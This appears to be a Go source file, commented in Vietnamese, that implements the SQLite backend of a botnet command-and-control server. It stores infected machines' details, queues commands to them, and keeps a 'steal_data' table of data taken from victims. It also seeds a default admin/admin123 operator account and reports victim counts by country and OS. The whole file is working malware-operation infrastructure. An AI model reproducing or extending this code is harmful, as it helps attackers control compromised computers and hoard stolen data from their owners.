/**
 * database.go
 * Quan ly database SQLite cho C2 server
 * Chuc nang: khoi tao, truy van, cap nhat bots, commands, steal_data, users
 * Moi nhat: loc bot trung IP, chi giu 1 bot/IP online
 */

package main

import (
    "database/sql"
    "log"
    
    _ "github.com/mattn/go-sqlite3"
)

/* Bien toan cuc database */
var DB *sql.DB

/**
 * Khoi tao database va tao cac bang neu chua ton tai
 */
func InitDatabase() {
    var err error
    
    /* Mo ket noi SQLite */
    DB, err = sql.Open("sqlite3", AppConfig.DBPath)
    if err != nil {
        log.Fatal("[DB] Khong the mo database: ", err)
    }
    
    /* Bat che do WAL de hieu suat tot hon */
    _, err = DB.Exec("PRAGMA journal_mode=WAL")
    if err != nil {
        log.Fatal("[DB] Khong the bat WAL mode: ", err)
    }
    
    /* Bat foreign keys */
    _, err = DB.Exec("PRAGMA foreign_keys=ON")
    if err != nil {
        log.Fatal("[DB] Khong the bat foreign keys: ", err)
    }
    
    /* Tao bang bots */
    _, err = DB.Exec(`
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            hostname TEXT NOT NULL,
            os TEXT NOT NULL,
            ip TEXT NOT NULL,
            country TEXT DEFAULT '',
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'online',
            cpu TEXT DEFAULT '',
            ram TEXT DEFAULT '',
            gpu TEXT DEFAULT '',
            disk TEXT DEFAULT '',
            local_ip TEXT DEFAULT '',
            arch TEXT DEFAULT '',
            is_admin INTEGER DEFAULT 0
        )
    `)
    if err != nil {
        log.Fatal("[DB] Khong the tao bang bots: ", err)
    }
    
    /* Tao bang commands */
    _, err = DB.Exec(`
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            bot_id TEXT NOT NULL,
            module TEXT NOT NULL,
            action TEXT NOT NULL,
            params TEXT DEFAULT '{}',
            status TEXT DEFAULT 'pending',
            result TEXT DEFAULT '',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (bot_id) REFERENCES bots(id)
        )
    `)
    if err != nil {
        log.Fatal("[DB] Khong the tao bang commands: ", err)
    }
    
    /* Tao bang steal_data */
    _, err = DB.Exec(`
        CREATE TABLE IF NOT EXISTS steal_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT NOT NULL,
            data_type TEXT NOT NULL,
            data TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (bot_id) REFERENCES bots(id)
        )
    `)
    if err != nil {
        log.Fatal("[DB] Khong the tao bang steal_data: ", err)
    }
    
    /* Tao bang users */
    _, err = DB.Exec(`
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password_hash TEXT NOT NULL,
            token TEXT DEFAULT ''
        )
    `)
    if err != nil {
        log.Fatal("[DB] Khong the tao bang users: ", err)
    }
    
    /* Tao admin mac dinh neu chua co */
    var count int
    err = DB.QueryRow("SELECT COUNT(*) FROM users WHERE username = 'admin'").Scan(&count)
    if err != nil || count == 0 {
        defaultHash := HashPassword("admin123")
        _, err = DB.Exec("INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)", "admin", defaultHash)
        if err != nil {
            log.Println("[DB] Khong the tao admin mac dinh: ", err)
        } else {
            log.Println("[DB] Da tao tai khoan admin mac dinh: admin/admin123")
        }
    }
    
    /* Tao index de tang toc truy van */
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_status ON bots(status)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_ip ON bots(ip)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_commands_bot_id ON commands(bot_id)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_steal_data_bot_id ON steal_data(bot_id)")
    DB.Exec("CREATE INDEX IF NOT EXISTS idx_steal_data_type ON steal_data(data_type)")
    
    log.Println("[DB] Da khoi tao database xong")
}

/**
 * Them bot moi vao database
 * Neu IP da co bot online, chi cap nhat thay vi tao moi (loc trung IP)
 */
func AddBot(bot *Bot) error {
    /* Kiem tra IP da co bot online chua */
    var existingID string
    err := DB.QueryRow("SELECT id FROM bots WHERE ip = ? AND status = 'online'", bot.IP).Scan(&existingID)
    if err == nil && existingID != "" {
        /* IP da co bot online, cap nhat thong tin thay vi tao moi */
        _, updateErr := DB.Exec(`UPDATE bots SET 
            hostname = ?, os = ?, last_seen = CURRENT_TIMESTAMP, 
            status = 'online', cpu = ?, ram = ?, gpu = ?, 
            disk = ?, local_ip = ?, arch = ?, is_admin = ? 
            WHERE id = ?`,
            bot.Hostname, bot.OS, bot.CPU, bot.RAM, bot.GPU, 
            bot.Disk, bot.LocalIP, bot.Arch, bot.Admin, existingID)
        if updateErr == nil {
            bot.ID = existingID
            log.Printf("[DB] Cap nhat bot trung IP: %s - %s", existingID, bot.IP)
        }
        return updateErr
    }
    
    /* IP moi, tao bot moi */
    _, err = DB.Exec(`
        INSERT OR REPLACE INTO bots 
        (id, hostname, os, ip, country, first_seen, last_seen, status, cpu, ram, gpu, disk, local_ip, arch, is_admin)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'online', ?, ?, ?, ?, ?, ?, ?)
    `, bot.ID, bot.Hostname, bot.OS, bot.IP, bot.Country, bot.FirstSeen, bot.LastSeen,
       bot.CPU, bot.RAM, bot.GPU, bot.Disk, bot.LocalIP, bot.Arch, bot.Admin)
    if err != nil {
        log.Printf("[DB] Loi them bot: %s", err.Error())
    }
    return err
}

/**
 * Cap nhat thong tin bot khi checkin
 */
func UpdateBotCheckin(botID string, ip string) error {
    _, err := DB.Exec(`
        UPDATE bots SET last_seen = CURRENT_TIMESTAMP, ip = ?, status = 'online' WHERE id = ?
    `, ip, botID)
    if err != nil {
        log.Printf("[DB] Loi cap nhat checkin: %s", err.Error())
    }
    return err
}

/**
 * Danh dau bot da offline qua thoi gian timeout
 */
func CleanupOfflineBots() {
    result, err := DB.Exec(`
        UPDATE bots SET status = 'offline' 
        WHERE status = 'online' AND last_seen < datetime('now', '-' || ? || ' minutes')
    `, int(AppConfig.BotTimeout.Minutes()))
    if err != nil {
        log.Println("[DB] Loi don dep bot offline: ", err)
    } else {
        affected, _ := result.RowsAffected()
        if affected > 0 {
            log.Printf("[DB] Da danh dau %d bot offline", affected)
        }
    }
}

/**
 * Them lenh moi vao database
 */
func AddCommand(cmd *Command) error {
    _, err := DB.Exec(`
        INSERT INTO commands (id, bot_id, module, action, params, status, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `, cmd.ID, cmd.BotID, cmd.Module, cmd.Action, cmd.Params, cmd.Status, cmd.CreatedAt, cmd.UpdatedAt)
    return err
}

/**
 * Cap nhat ket qua thuc thi lenh
 */
func UpdateCommandResult(cmdID string, status string, result string) error {
    _, err := DB.Exec(`
        UPDATE commands SET status = ?, result = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?
    `, status, result, cmdID)
    return err
}

/**
 * Xoa lenh cu het han
 */
func CleanupOldCommands() {
    result, err := DB.Exec(`
        DELETE FROM commands 
        WHERE created_at < datetime('now', '-' || ? || ' hours')
    `, int(AppConfig.CmdRetention.Hours()))
    if err != nil {
        log.Println("[DB] Loi xoa lenh cu: ", err)
    } else {
        affected, _ := result.RowsAffected()
        if affected > 0 {
            log.Printf("[DB] Da xoa %d lenh cu", affected)
        }
    }
}

/**
 * Luu du lieu steal vao database
 */
func SaveStealData(botID string, dataType string, data string) error {
    _, err := DB.Exec(`
        INSERT INTO steal_data (bot_id, data_type, data) VALUES (?, ?, ?)
    `, botID, dataType, data)
    return err
}

/**
 * Lay danh sach bot co filter
 */
func GetBots(status string, country string, search string, limit int, offset int) ([]Bot, error) {
    query := "SELECT id, hostname, os, ip, country, first_seen, last_seen, status, cpu, ram, gpu, disk, local_ip, arch, is_admin FROM bots WHERE 1=1"
    args := []interface{}{}
    
    if status != "" {
        query += " AND status = ?"
        args = append(args, status)
    }
    
    if country != "" {
        query += " AND country = ?"
        args = append(args, country)
    }
    
    if search != "" {
        query += " AND (hostname LIKE ? OR ip LIKE ? OR os LIKE ?)"
        searchPattern := "%" + search + "%"
        args = append(args, searchPattern, searchPattern, searchPattern)
    }
    
    query += " ORDER BY last_seen DESC"
    
    if limit > 0 {
        query += " LIMIT ?"
        args = append(args, limit)
        if offset > 0 {
            query += " OFFSET ?"
            args = append(args, offset)
        }
    }
    
    rows, err := DB.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    var bots []Bot
    for rows.Next() {
        var bot Bot
        err := rows.Scan(&bot.ID, &bot.Hostname, &bot.OS, &bot.IP, &bot.Country,
            &bot.FirstSeen, &bot.LastSeen, &bot.Status, &bot.CPU, &bot.RAM,
            &bot.GPU, &bot.Disk, &bot.LocalIP, &bot.Arch, &bot.Admin)
        if err != nil {
            log.Println("[DB] Loi scan bot: ", err)
            continue
        }
        bots = append(bots, bot)
    }
    
    return bots, nil
}

/**
 * Lay chi tiet 1 bot theo ID
 */
func GetBotByID(botID string) (*Bot, error) {
    var bot Bot
    err := DB.QueryRow(`
        SELECT id, hostname, os, ip, country, first_seen, last_seen, status, cpu, ram, gpu, disk, local_ip, arch, is_admin
        FROM bots WHERE id = ?
    `, botID).Scan(&bot.ID, &bot.Hostname, &bot.OS, &bot.IP, &bot.Country,
        &bot.FirstSeen, &bot.LastSeen, &bot.Status, &bot.CPU, &bot.RAM,
        &bot.GPU, &bot.Disk, &bot.LocalIP, &bot.Arch, &bot.Admin)
    if err != nil {
        return nil, err
    }
    return &bot, nil
}

/**
 * Lay danh sach lenh co filter
 */
func GetCommands(botID string, status string, limit int) ([]Command, error) {
    query := "SELECT id, bot_id, module, action, params, status, result, created_at, updated_at FROM commands WHERE 1=1"
    args := []interface{}{}
    
    if botID != "" {
        query += " AND bot_id = ?"
        args = append(args, botID)
    }
    
    if status != "" {
        query += " AND status = ?"
        args = append(args, status)
    }
    
    query += " ORDER BY created_at DESC"
    
    if limit > 0 {
        query += " LIMIT ?"
        args = append(args, limit)
    }
    
    rows, err := DB.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    var commands []Command
    for rows.Next() {
        var cmd Command
        err := rows.Scan(&cmd.ID, &cmd.BotID, &cmd.Module, &cmd.Action, &cmd.Params,
            &cmd.Status, &cmd.Result, &cmd.CreatedAt, &cmd.UpdatedAt)
        if err != nil {
            log.Println("[DB] Loi scan command: ", err)
            continue
        }
        commands = append(commands, cmd)
    }
    
    return commands, nil
}

/**
 * Lay du lieu steal co filter
 */
func GetStealData(botID string, dataType string, limit int) ([]StealData, error) {
    query := "SELECT id, bot_id, data_type, data, timestamp FROM steal_data WHERE 1=1"
    args := []interface{}{}
    
    if botID != "" {
        query += " AND bot_id = ?"
        args = append(args, botID)
    }
    
    if dataType != "" {
        query += " AND data_type = ?"
        args = append(args, dataType)
    }
    
    query += " ORDER BY timestamp DESC"
    
    if limit > 0 {
        query += " LIMIT ?"
        args = append(args, limit)
    }
    
    rows, err := DB.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    var steals []StealData
    for rows.Next() {
        var s StealData
        err := rows.Scan(&s.ID, &s.BotID, &s.DataType, &s.Data, &s.Timestamp)
        if err != nil {
            log.Println("[DB] Loi scan steal: ", err)
            continue
        }
        steals = append(steals, s)
    }
    
    return steals, nil
}

/**
 * Lay thong ke tong quan
 */
func GetStats() (map[string]interface{}, error) {
    stats := make(map[string]interface{})
    
    var totalBots, onlineBots, offlineBots int
    var totalCommands, totalSteals int
    
    DB.QueryRow("SELECT COUNT(*) FROM bots").Scan(&totalBots)
    stats["total_bots"] = totalBots
    
    DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'online'").Scan(&onlineBots)
    stats["online_bots"] = onlineBots
    
    DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'offline'").Scan(&offlineBots)
    stats["offline_bots"] = offlineBots
    
    DB.QueryRow("SELECT COUNT(*) FROM commands").Scan(&totalCommands)
    stats["total_commands"] = totalCommands
    
    DB.QueryRow("SELECT COUNT(*) FROM steal_data").Scan(&totalSteals)
    stats["total_steals"] = totalSteals
    
    /* Phan bo theo quoc gia */
    countryRows, err := DB.Query("SELECT country, COUNT(*) as cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 10")
    if err == nil {
        countries := make(map[string]int)
        for countryRows.Next() {
            var country string
            var cnt int
            countryRows.Scan(&country, &cnt)
            if country == "" {
                country = "Unknown"
            }
            countries[country] = cnt
        }
        countryRows.Close()
        stats["countries"] = countries
    }
    
    /* Phan bo theo OS */
    osRows, err := DB.Query("SELECT os, COUNT(*) as cnt FROM bots GROUP BY os")
    if err == nil {
        osStats := make(map[string]int)
        for osRows.Next() {
            var os string
            var cnt int
            osRows.Scan(&os, &cnt)
            if os == "" {
                os = "Unknown"
            }
            osStats[os] = cnt
        }
        osRows.Close()
        stats["os_distribution"] = osStats
    }
    
    return stats, nil
}

/**
 * Cap nhat token cho user
 */
func UpdateUserToken(username string, token string) error {
    _, err := DB.Exec("UPDATE users SET token = ? WHERE username = ?", token, username)
    return err
}

/**
 * Lay user theo username
 */
func GetUserByUsername(username string) (*User, error) {
    var user User
    err := DB.QueryRow("SELECT username, password_hash, token FROM users WHERE username = ?", username).Scan(
        &user.Username, &user.PasswordHash, &user.Token)
    if err != nil {
        return nil, err
    }
    return &user, nil
}
